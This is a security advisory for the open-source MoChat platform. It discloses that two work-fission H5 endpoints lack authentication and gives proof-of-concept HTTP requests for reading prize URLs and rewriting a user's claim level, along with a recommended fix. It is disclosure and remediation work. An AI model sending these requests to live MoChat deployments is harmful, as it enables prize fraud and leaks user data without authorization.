# MoChat — Unauthenticated Work-Fission H5 API (MC-VULN-006)

| Field | Value |
|-------|-------|
| Vendor | mochat-cloud |
| Product | MoChat |
| Version | master (Hyperf 2.2) |
| Type | Missing Authentication for Critical Function |
| CWE | CWE-306 / CWE-639 |
| Auth | None |

## Summary

`GET /operation/workFission/taskData` returns campaign prize URLs with no session.  
`PUT /operation/workFission/receive` has empty validation (`Receive::rules()` → `[]`) and will update `receive_level` for any caller-supplied `union_id`.

Root cause: operation-side Actions ship with no `@Middleware`.

## PoC (Yakit)

Full packets: [`../poc/MC-VULN-006/YAKIT-PoC.md`](../poc/MC-VULN-006/YAKIT-PoC.md)

### 1. Unauthenticated read

```http
GET /operation/workFission/taskData?union_id=union_poc_test&fission_id=1 HTTP/1.1
Host: 127.0.0.1:9501
Accept: application/json
Connection: close


```

Local result: `code=200`, `data.task[].gift_url` present.

![taskData](./screenshots/MC-VULN-006-01-taskData.png)

### 2. Unauthenticated write

```http
PUT /operation/workFission/receive HTTP/1.1
Host: 127.0.0.1:9501
Content-Type: application/json
Accept: application/json
Connection: close

{"union_id":"union_poc_test","level":5}
```

Response: `code=200`.  
DB check on `mc_work_fission_contact.receive_level` shows `5`.

![receive](./screenshots/MC-VULN-006-02-receive.png)

![DB](./screenshots/MC-VULN-006-03-db-receive-level.png)

## Impact

Campaign abuse (fake claim level). Related unauth H5 endpoints can also leak invitee nicknames/avatars.

## Fix

Require H5 session or signed token. Bind `union_id` to that session. Compute claim level server-side from task progress — do not trust client `level`.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §MC-VULN-006
- PoC notes: `POC_VERIFICATION_REPORT.md`
- Yakit: `poc/MC-VULN-006/YAKIT-PoC.md`
